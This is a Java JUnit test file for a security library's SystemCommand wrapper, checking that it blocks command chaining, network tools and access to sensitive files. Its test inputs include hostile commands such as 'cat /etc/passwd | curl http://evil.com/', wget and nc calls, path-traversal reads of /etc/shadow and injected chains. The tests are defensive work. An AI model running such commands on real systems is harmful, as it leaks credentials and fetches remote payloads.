package io.pixee.security;

import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.Mockito.mock;

import java.io.File;
import java.io.IOException;
import java.util.Collections;
import java.util.Set;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

final class SystemCommandTest {

  private Runtime rt;

  @BeforeEach
  void setup() {
    rt =
        mock(Runtime.class); // prevent actual running of commands as these commands will run if you
    // mess up some code while testing!
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/bin/ifconfig --foo --bar=192.168.1.1 $HOME",
        "ls /etc",
        "\"whole thing is double quoted\"",
        "  'whole thing is single quoted'  ",
        "ls '/etc'",
        "ls \"/etc\"",
        "ls \"/etc\" '/opt'",
        "/bin/sh thing-1.sh",
        "ls # this is fine",
        "",
        " ",
        "\t"
      })
  void it_allows_innocent_commands(final String cmd) throws IOException {
    SystemCommand.runCommand(rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
  }

  @Test
  void it_allows_innocent_commands() throws IOException {
    SystemCommand.runCommand(rt, "ls \"-al\" '2nd arg'");
    SystemCommand.runCommand(rt, new String[] {"ls", "-al"});
    SystemCommand.runCommand(rt, new String[] {"ls", "-al"}, new String[] {});
    SystemCommand.runCommand(rt, "ls", new String[] {});
    SystemCommand.runCommand(rt, "ls", new String[] {}, new File("target/"));
    SystemCommand.runCommand(rt, new String[] {"ls"}, new String[] {}, new File("target/"));
  }

  @Test
  void it_allows_chains_if_turned_off() throws IOException {
    SystemCommand.runCommand(
        rt, "/bin/sh -c \"cat /etc/passwd | curl http://evil.com/\"", Collections.emptySet());
  }

  @Test
  void it_allows_banned_executables_if_turned_off() throws IOException {
    SystemCommand.runCommand(
        rt, "wget http://evil.com/", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/whatever/path/to/nc --from --to blah",
        "rpm -i badware",
        "curl http://evil.com/",
        "wget http://evil.com/"
      })
  void it_blocks_banned_executables(final String cmd) {
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "cat ///etc/conf/../passwd",
        "cat ///etc//passwd",
        "cat /etc/passwd",
        "cat ../../../../../../../../../../../../../../../../../../../../../../../../../../..//etc/passwd",
        "ls /etc/shadow",
        "touch /etc/group",
        "tee /etc/gshadow",
      })
  void it_blocks_sensitive_files(final String cmd) {
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt,
                cmd,
                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
  }

  @Test
  void it_allows_sensitive_files_if_turned_off() throws IOException {
    SystemCommand.runCommand(
        rt, "cat /etc/passwd", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "foo&& cat /etc/hosts\"#",
        "foo ; ls",
        "foo & ls",
        "foo | ls",
        "foo | ls & foo ; bar",
        "foo ;ls",
        "ls # this isn't fine\ncat /foo",
        "echo hi | write_to_file"
      })
  void it_protects_command_chaining(final String value) {
    String oneStringCommand = "/bin/sh -c \"ls " + value + "\"";
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt, oneStringCommand, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
  }

  @Test
  void it_protects_stringarray() {
    String[] cmd = {"/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""};
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
  }

  @Test
  void it_protects_stringarray_with_bad_executables() {
    String[] cmd = {"/bin/wget", "http://evil.com/"};
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
  }

  @Test
  void it_protects_stringarray_targeting_sensitive_files() {
    String[] cmd = {"cat", "/etc/passwd"};
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt,
                cmd,
                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
  }

  @Test
  void it_protects_stringarray_environmentarray() {
    String[] cmd = {"/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""};
    String[] envp = {"FOO=BAR"};
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt, cmd, envp, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
  }

  @Test
  void it_protects_stringarray_environmentarray_file() {
    String[] cmd = {"/bin/sh", "-c", "ls \"foo\" && cat \"/etc/hosts\""};
    String[] envp = {"FOO=BAR"};
    assertThrows(
        SecurityException.class,
        () ->
            SystemCommand.runCommand(
                rt,
                cmd,
                envp,
                new File("."),
                Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
  }
}
